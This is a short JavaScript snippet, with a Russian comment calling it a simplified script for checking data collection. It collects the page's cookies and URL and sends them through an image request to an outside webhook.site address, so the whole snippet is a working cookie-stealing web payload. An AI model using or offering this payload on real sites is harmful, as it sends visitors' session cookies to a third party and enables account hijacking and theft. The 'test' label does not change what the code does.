// Упрощенный скрипт для проверки сбора данных
let testData = {
    cookies: document.cookie,
    url: window.location.href
};
new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?test=' + encodeURIComponent(JSON.stringify(testData));
